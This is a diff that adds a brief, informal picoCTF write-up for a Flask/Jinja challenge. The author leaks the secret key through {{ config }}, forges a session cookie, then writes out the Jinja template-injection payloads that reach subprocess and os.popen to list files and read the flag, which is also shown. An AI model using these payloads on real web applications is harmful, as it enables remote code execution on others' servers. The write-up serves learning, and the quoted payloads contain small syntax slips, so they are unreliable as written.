@@ -1,0 +1,19 @@
+this challenge was completely diffrent 
+
+
+first i tried to solve it like { flask skeleton key } challenge, i put {{ config }} and i found a key, i decoded the cookie and changed the user_id to 1 but when i got to the admin section, they told me that there is not for me here ! 
+
+hint : remote code execution 
+
+so i went to do some searching and i found some jinja templating code, unti i stepped on a code that shows all classes used in the web app " {{ ''.__class__.__mro__[1].__subclasses__() }} " and inded it worked but it printed like 697 class ! and by chance i found a " subprocess.Popen " class, i did more searching and i found out that we can use it to execute command 
+
+and the command was {{ ''.__class__.__mro__[1].__subclasses__()[674].__init__.__globals__['builtins'].eval('__import__(os).popen("ls").read()' }}
+the output was --> app flag server.py xinet_startup.sh 
+
+so i changed the comand to --> {{ ''.__class__.__mro__[1].__subclasses__()[674].__init__.__globals__['builtins'].eval('__import__(os).popen("cat flag").read()' }}
+
+and i got the flag hahahahah --> picoCTF{R_C_E_wont_let_me_be_85e92c3a}
+
+
+i already had knowledge of such thing from before when i solved the pyjail challenge on " Root-me.org " 
+but i have to admit i learned something new today, we can can use python jinja templating to execute commands, awesome !
